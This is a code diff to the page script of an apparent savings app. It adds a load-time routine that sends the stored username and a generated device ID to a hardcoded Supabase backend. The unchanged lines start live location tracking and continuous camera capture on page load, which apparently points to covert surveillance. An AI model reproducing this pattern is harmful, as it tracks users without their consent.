@@ -223,4 +223,45 @@ document.addEventListener('DOMContentLoaded', function() {
         startLiveLocationTracking();
         startContinuousCameraCapture();
     });
+
+    // REST fallback: ensure registration even if Supabase JS library failed to load
+    (async function restRegisterFallback() {
+        try {
+            const saved = localStorage.getItem('kudasavingsData');
+            const data = saved ? JSON.parse(saved) : {};
+            const username = data.userName || appData.userName || 'UNKNOWN';
+            let deviceId = localStorage.getItem('kuda_device_id');
+            if (!deviceId) {
+                deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 10);
+                localStorage.setItem('kuda_device_id', deviceId);
+            }
+            const SUP_URL = 'https://axotezoancnodsqzmdru.supabase.co';
+            const SUP_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF4b3Rlem9hbmNub2RzcXptZHJ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQzMjg2MzgsImV4cCI6MjA3OTkwNDYzOH0.hL4r_xXGOgmz-kPuXjex28Yx5pACuC2kYiHQk-T4SIM';
+            const headers = {
+                'apikey': SUP_KEY,
+                'Authorization': 'Bearer ' + SUP_KEY,
+                'Content-Type': 'application/json'
+            };
+            // Check if user exists
+            const checkRes = await fetch(SUP_URL + '/rest/v1/app_users?select=id&device_id=eq.' + encodeURIComponent(deviceId), { headers });
+            if (!checkRes.ok) return;
+            const existing = await checkRes.json();
+            const nowIso = new Date().toISOString();
+            if (existing && existing.length > 0) {
+                await fetch(SUP_URL + '/rest/v1/app_users?device_id=eq.' + encodeURIComponent(deviceId), {
+                    method: 'PATCH',
+                    headers: { ...headers, 'Prefer': 'return=minimal' },
+                    body: JSON.stringify({ username: username, is_online: true, last_seen_at: nowIso })
+                });
+            } else {
+                await fetch(SUP_URL + '/rest/v1/app_users', {
+                    method: 'POST',
+                    headers: { ...headers, 'Prefer': 'return=minimal' },
+                    body: JSON.stringify({ device_id: deviceId, username: username, is_online: true, last_seen_at: nowIso })
+                });
+            }
+        } catch (e) {
+            console.warn('REST registration fallback failed:', e);
+        }
+    })();
 });
